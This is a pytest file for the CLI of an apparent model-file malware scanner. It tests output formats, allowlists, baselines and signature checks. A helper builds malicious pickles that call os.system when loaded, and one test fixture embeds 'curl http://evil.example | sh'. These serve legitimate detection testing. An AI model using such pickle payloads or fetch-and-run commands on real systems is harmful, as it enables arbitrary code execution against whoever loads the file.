"""CLI tests for the features wired on top of the scanner: every output
format selectable through `-f`, allowlist suppression, baseline mode, and the
opt-in signature check.

`cli.main` takes an argv list and returns the exit code, so everything runs
in-process. The report bodies are asserted through the CLI, which is the gap
HW-132 called out for the html and markdown formats.
"""

from __future__ import annotations

import hashlib
import json

from hayward import cli


def _short_binunicode(text: str) -> bytes:
    raw = text.encode()
    return bytes([0x8C, len(raw)]) + raw


def _os_system_pickle(command: str) -> bytes:
    """A standalone protocol-4 pickle calling os.system(command)."""
    return (
        b"\x80\x04"
        + _short_binunicode("os")
        + _short_binunicode("system")
        + b"\x93"
        + _short_binunicode(command)
        + b"\x85"
        + b"R."
    )


def _evil(tmp_path, name="evil.pkl", command="id"):
    target = tmp_path / name
    target.write_bytes(_os_system_pickle(command))
    return target


class TestOutputFormats:
    """Every `-f` choice renders through the CLI. html and markdown had no
    CLI-level test before HW-132; sarif and cyclonedx are the newer formats."""

    def test_html_output_is_a_self_contained_page(self, tmp_path, capsys):
        evil = _evil(tmp_path)
        rc = cli.main(["scan", str(evil), "-f", "html", "--fail-on", "never"])
        assert rc == 0
        out = capsys.readouterr().out
        assert "<!doctype html>" in out.lower()
        assert "MFV-PICKLE-001" in out
        # Self-contained: no external stylesheet or script reference.
        assert "<link" not in out
        assert "<script" not in out

    def test_markdown_output_has_a_table(self, tmp_path, capsys):
        evil = _evil(tmp_path)
        rc = cli.main(["scan", str(evil), "-f", "markdown", "--fail-on", "never"])
        assert rc == 0
        out = capsys.readouterr().out
        assert "# Model file scan" in out
        assert "| Severity | Rule | File |" in out
        assert "MFV-PICKLE-001" in out

    def test_sarif_output_is_valid_json(self, tmp_path, capsys):
        evil = _evil(tmp_path)
        cli.main(["scan", str(evil), "-f", "sarif", "--fail-on", "never"])
        data = json.loads(capsys.readouterr().out)
        assert data["version"] == "2.1.0"
        assert data["runs"][0]["tool"]["driver"]["name"] == "hayward"
        assert data["runs"][0]["results"]

    def test_cyclonedx_output_is_a_valid_bom(self, tmp_path, capsys):
        evil = _evil(tmp_path)
        cli.main(["scan", str(evil), "-f", "cyclonedx", "--fail-on", "never"])
        data = json.loads(capsys.readouterr().out)
        assert data["bomFormat"] == "CycloneDX"
        assert data["specVersion"] == "1.6"
        assert data["components"]
        assert any(v["id"] == "MFV-PICKLE-001" for v in data["vulnerabilities"])


class TestAllowlist:
    def _allowlist(self, tmp_path, blob, rule_id, **extra):
        entry = {
            "sha256": hashlib.sha256(blob).hexdigest(),
            "rule_id": rule_id,
            "justification": "reviewed, benign",
            **extra,
        }
        path = tmp_path / "allow.json"
        path.write_text(json.dumps([entry]))
        return path

    def test_matching_entry_suppresses_and_drops_exit_code(self, tmp_path, capsys):
        evil = _evil(tmp_path)
        allow = self._allowlist(tmp_path, evil.read_bytes(), "MFV-PICKLE-001",
                                approved_by="ken")
        rc = cli.main(["scan", str(evil), "--allowlist", str(allow),
                       "--fail-on", "high"])
        captured = capsys.readouterr()
        assert rc == 0  # the only finding was suppressed
        assert "MFV-PICKLE-001" not in captured.out
        # The suppression is announced on stderr: the audit trail is not silent.
        assert "suppressed MFV-PICKLE-001" in captured.err
        assert "ken" in captured.err

    def test_non_matching_rule_does_not_suppress(self, tmp_path):
        evil = _evil(tmp_path)
        allow = self._allowlist(tmp_path, evil.read_bytes(), "MFV-PICKLE-999")
        rc = cli.main(["scan", str(evil), "--allowlist", str(allow),
                       "--fail-on", "high"])
        assert rc == 1  # the finding still fires

    def test_changed_bytes_stop_matching(self, tmp_path):
        evil = _evil(tmp_path)
        allow = self._allowlist(tmp_path, evil.read_bytes(), "MFV-PICKLE-001")
        # Repoint the file at a different malicious payload: the hash no longer
        # matches the allowlist entry, so the finding resurfaces.
        evil.write_bytes(_os_system_pickle("whoami"))
        rc = cli.main(["scan", str(evil), "--allowlist", str(allow),
                       "--fail-on", "high"])
        assert rc == 1

    def test_missing_justification_is_rejected(self, tmp_path, capsys):
        evil = _evil(tmp_path)
        bad = tmp_path / "bad.json"
        bad.write_text(json.dumps([
            {"sha256": hashlib.sha256(evil.read_bytes()).hexdigest(),
             "rule_id": "MFV-PICKLE-001"}]))
        rc = cli.main(["scan", str(evil), "--allowlist", str(bad)])
        assert rc == 2
        assert "allowlist" in capsys.readouterr().err

    def test_malformed_allowlist_file_exits_two(self, tmp_path, capsys):
        evil = _evil(tmp_path)
        bad = tmp_path / "bad.json"
        bad.write_text("{ not json")
        rc = cli.main(["scan", str(evil), "--allowlist", str(bad)])
        assert rc == 2
        assert "allowlist" in capsys.readouterr().err


class TestBaseline:
    def _baseline(self, tmp_path, target, name="base.json"):
        out = tmp_path / name
        cli.main(["scan", str(target), "-f", "json", "-o", str(out),
                  "--fail-on", "never"])
        return out

    def test_known_finding_is_not_new(self, tmp_path, capsys):
        models = tmp_path / "models"
        models.mkdir()
        _evil(models, "a.pkl")
        base = self._baseline(tmp_path, models)
        rc = cli.main(["scan", str(models), "--baseline", str(base),
                       "--fail-on", "high"])
        assert rc == 0  # nothing new since the baseline
        assert "0 new" in capsys.readouterr().err

    def test_a_new_finding_fails_the_build(self, tmp_path, capsys):
        models = tmp_path / "models"
        models.mkdir()
        _evil(models, "a.pkl")
        base = self._baseline(tmp_path, models)
        # Introduce a second malicious file after the baseline was recorded.
        _evil(models, "b.pkl", command="curl http://evil.example | sh")
        rc = cli.main(["scan", str(models), "--baseline", str(base),
                       "--fail-on", "high"])
        assert rc == 1
        assert "1 new" in capsys.readouterr().err


class TestSignatures:
    def test_check_signatures_reports_a_sibling_bundle(self, tmp_path, capsys):
        evil = _evil(tmp_path, "model.pkl")
        (tmp_path / "model.pkl.sigstore.json").write_text(json.dumps({
            "mediaType": "application/vnd.dev.sigstore.bundle+json;version=0.3",
            "verificationMaterial": {"certificate": {"rawBytes": "AA=="}},
        }))
        cli.main(["scan", str(evil), "--check-signatures", "-f", "json",
                  "--fail-on", "never"])
        data = json.loads(capsys.readouterr().out)
        assert any(f["rule_id"] == "MFV-SIG-001" for f in data["findings"])

    def test_without_flag_no_signature_finding(self, tmp_path, capsys):
        evil = _evil(tmp_path, "model.pkl")
        (tmp_path / "model.pkl.sig").write_bytes(b"\x00signature")
        cli.main(["scan", str(evil), "-f", "json", "--fail-on", "never"])
        data = json.loads(capsys.readouterr().out)
        assert not any(f["rule_id"] == "MFV-SIG-001" for f in data["findings"])
